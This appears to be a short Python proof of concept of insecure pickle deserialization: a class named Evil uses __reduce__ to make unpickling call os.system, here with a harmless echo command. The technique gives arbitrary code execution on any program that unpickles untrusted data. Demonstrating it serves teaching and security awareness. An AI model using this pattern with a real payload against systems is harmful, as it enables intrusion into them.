```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

data = pickle.dumps(Evil())
pickle.loads(data)
```